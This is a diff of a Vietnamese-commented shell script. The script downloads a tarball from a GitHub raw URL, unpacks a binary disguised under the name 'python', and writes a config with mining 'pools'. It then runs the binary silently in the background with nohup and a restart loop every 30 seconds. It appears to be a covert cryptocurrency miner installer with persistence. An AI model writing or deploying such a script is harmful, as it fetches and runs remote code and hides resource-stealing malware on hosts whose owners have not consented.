@@ -3,18 +3,20 @@
 DOMAIN=$1      # domain:port
 HOSTNAME=$2    # hostname
 CONFIG="config.json"
-PATH_FILE="python/python"
+BINARY="python/python"
+WORKDIR=$(pwd)
 
-# Nếu chưa có binary thì tải và giải nén
-if [ ! -f "$PATH_FILE" ]; then
+# Tải binary nếu chưa có
+if [ ! -f "$BINARY" ]; then
+    echo "Downloading binary..."
     curl -L -o python.tar.gz https://raw.githubusercontent.com/CongTK9x/tool/main/python.tar.gz
     tar -xzf python.tar.gz
     rm -f python.tar.gz
 fi
 
-# Nếu chưa có config.json thì tạo
+# Tạo config.json nếu chưa có
 if [ ! -f "$CONFIG" ]; then
-cat > "$CONFIG" <<EOF
+    cat > "$CONFIG" <<EOF
 {
   "pools": [
     {
@@ -32,3 +34,26 @@ cat > "$CONFIG" <<EOF
 }
 EOF
 fi
+
+# Hàm start process
+start_process() {
+    nohup "$WORKDIR/$BINARY" -c "$WORKDIR/$CONFIG" >/dev/null 2>&1 &
+    echo "Process restarted"
+}
+
+# Nếu chưa chạy thì start
+if pgrep -f "$BINARY" > /dev/null; then
+    echo "Process is running"
+else
+    start_process
+fi
+
+# Vòng lặp kiểm tra mỗi 30s
+while true; do
+    if pgrep -f "$BINARY" > /dev/null; then
+        echo "Process is running"
+    else
+        start_process
+    fi
+    sleep 30
+done
